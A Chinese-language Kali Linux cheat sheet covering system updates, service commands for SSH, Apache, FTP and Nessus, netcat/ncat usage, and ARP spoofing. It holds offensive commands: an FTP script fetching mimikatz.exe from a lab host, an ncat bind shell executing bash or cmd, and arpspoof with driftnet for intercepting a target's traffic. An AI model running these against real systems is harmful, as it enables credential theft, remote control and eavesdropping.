# Kali 操作

## 更新升级

- apt-get update (更新软件包列表库)
- apt-get upgrade (更新安装的软件包)
- apt-get dist-upgrade (根据依赖关系更新)
- apt-get clean (清除缓存索引)
- reboot (重新启动)

## Kali 网络问题

- service network-manager stop
- rm /var/lib/NetworkManager/NetworkManager.state
- service network-manager start

## SSH

- service ssh start (开启 ssh 服务)
- service ssh restart (重启 ssh 服务)
- service ssh status (查看 ssh 状态)

## Apache

- service apache2 start (开启 Apache 服务)
- service apache2 restart (重启 Apache 服务)
- service apache2 status (查看 Apache 状态)
- 默认目录 /var/www/html
- 目录配置 /etc/apache2/sites-available/000-default.conf

## ftp

- service vsftpd start (开启 ftp 服务)
- service vsftpd restart (重启 ftp 服务)
- service vsftpd status (查看 ftp 状态)
- 文件目录 /home/ftp

```
echo open 192.168.253.130 21>ftp.txt
echo ftp>>ftp.txt
echo 123456>>ftp.txt
echo bin>>ftp.txt
echo get mimikatz.exe>>ftp.txt
echo bye>>ftp.txt
----------------
ftp -s:ftp.txt
```

## nc

- -h 显示帮助选项
- -l 绑定并监听传入连接
- -p 指定要使用的端口
- -c 通过/bin/sh 执行给定的命令
- -q 执行完毕 X 秒后退出
- -n 数字 ip,不通过 DNS 解析
- -v 显示详细信息
- -u 使用 UDP 模式
- -z 使用扫描模式

```
A：nc -lp 端口 | 解密方式 > 文件
B：加密方式 < a.mp4 | nc -nv IP地址 端口 -q 时间
```

## ncat

- --allow 只允许给定的主机连接到 Ncat
- --ssl 使用 SSL 连接或监听

```
A：ncat -c bash/cmd --allow IP 地址 -vnl 端口 --ssl
B：ncat -nv IP 地址 端口 --ssl
```

## Nessus

- service nessusd start (启动 Nessus)
- service nessusd status (查看 Nessus 状态)
- https://192.168.253.130:8834/

## ARP

- 路由转发: echo 1 > /proc/sys/net/ipv4/ip_forward
- arp 欺骗: arpspoof -i eth0（网卡） -t 192.168.0.144(目标 IP) 192.168.0.1（网关）
- 图片嗅探: driftnet -i eth0
- 